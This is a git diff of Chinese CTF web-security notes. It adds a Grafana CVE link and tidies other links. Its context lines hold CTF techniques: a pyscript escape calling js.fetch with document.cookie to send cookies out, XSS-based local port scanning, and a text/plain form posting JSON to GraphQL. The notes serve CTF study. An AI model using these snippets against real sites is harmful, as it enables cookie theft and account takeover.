@@ -6,6 +6,13 @@
 
 标记`*`的条目原先是web3相关内容，现已移入Web3笔记->Legacy
 
+## Resources
+
+- [CVE-2025-4123](https://nightbloodz.github.io/grafana-CVE-2025-4123)
+    - Grafana Full read SSRF and Account Takeover
+    - https://grafana.com/blog/2025/07/17/grafana-security-release-medium-and-high-severity-fixes-for-cve-2025-6197-and-cve-2025-6023
+    - https://www.sonicwall.com/blog/high-severity-open-redirect-vulnerability-in-grafana-leads-to-account-takeover-cve-2025-4123
+
 ## SQL注入
 
 资料链接：
@@ -2884,9 +2891,10 @@ python:false
 mariadb:true
 ```
 json由处理差异导致的漏洞可参考 https://bishopfox.com/blog/json-interoperability-vulnerabilities ，从这里面提到的内容入手
+- go相关解析差异见 https://blog.trailofbits.com/2025/06/17/unexpected-security-footguns-in-gos-parsers
 
-241. [RESTful swap](https://xhacka.github.io/posts/RESTful-swap/)
-- 使用vim编辑文件后会额外出现[swap](https://www.baeldung.com/linux/vim-swap-files#:~:text=While%20editing%20a%20file%20with,copy%20of%20the%20edited%20file.)文件，为被编辑文件的拷贝，也就是说里面有被编辑文件的内容。swap文件命名遵循以下规律：
+241. [RESTful swap](https://xhacka.github.io/posts/RESTful-swap)
+- 使用vim编辑文件后会额外出现[swap](https://www.baeldung.com/linux/vim-swap-files)文件，为被编辑文件的拷贝，也就是说里面有被编辑文件的内容。swap文件命名遵循以下规律：
 ```sh
 ls -a
 . .. file1
@@ -2900,7 +2908,7 @@ ls -a
 but = dict.__base__.__subclasses__()[363]("buttons") #363为pyscript.Element。此处获取按钮
 but.element.innerHTML= ''
 ```
-- 当python环境中无builtins时，可以参考这篇[帖子](https://www.reddit.com/r/Python/comments/yaqoux/recovering_cleared_globals_and_builtins/)恢复原本的builtins。有了builtins就能正常使用import了。 https://ctftime.org/writeup/37185
+- 当python环境中无builtins时，可以参考这篇[帖子](https://www.reddit.com/r/Python/comments/yaqoux/recovering_cleared_globals_and_builtins)恢复原本的builtins。有了builtins就能正常使用import了。 https://ctftime.org/writeup/37185
 - 从pyscript中可以获取js模块，进而可使用js的函数。
 ```py
 js = sys.modules['pyscr' + 'ipt'].js
@@ -2908,7 +2916,7 @@ js.fetch("url" + js.document.cookie)
 ```
 242. [trusted shop](https://ctftime.org/writeup/37177)
 - js puppeteer+xss。注意puppeteer基本等于headless chrome，其打开/访问的页面可能会出现xss。反之普通的fetch等访问页面则不会出现。xss的本质是以打开网页的受害者的身份执行js代码，所以可以：
-  - 扫描本机端口。代码参考这篇[帖子](https://www.incolumitas.com/2021/01/10/browser-based-port-scanning/)。wp里有改动后脚本，将测试数量改为10以求更快的速度（虽然可能出现false positive），同时删除并行（parallel）因为题目服务器无法支持并行的多个同时请求。
+  - 扫描本机端口。代码参考这篇[帖子](https://www.incolumitas.com/2021/01/10/browser-based-port-scanning)。wp里有改动后脚本，将测试数量改为10以求更快的速度（虽然可能出现false positive），同时删除并行（parallel）因为题目服务器无法支持并行的多个同时请求。
   - 发送graphql请求。此处又有一个小技巧：假设网站开启了同源策略（same-origin policy），xss想要发送某些内容到非同源的网站就不能简单使用fetch了，不过可以用form。如果目标网站(比如graphql)只接收json数据该怎么办？如何用html form发送json数据？可以像下面这样：
     ```html
     <form name="myForm" id="myForm" action="url" method="POST" enctype="text/plain">
